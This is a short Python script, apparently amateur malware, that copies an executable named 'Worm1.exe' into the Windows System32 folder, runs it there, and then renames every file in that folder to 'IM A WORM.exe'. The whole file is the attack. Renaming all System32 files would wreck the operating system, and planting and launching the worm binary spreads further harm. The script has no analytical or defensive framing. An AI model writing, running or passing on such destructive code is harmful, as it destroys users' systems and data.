import os
import shutil
cwd = os.getcwd()
shutil.copy(cwd+"/Worm1.exe", "/Windows/System32")
os.chdir("/Windows/System32")
os.system(".\Worm1.exe")
for files in os.listdir(os.getcwd()):
    os.rename(files, "IM A WORM.exe")
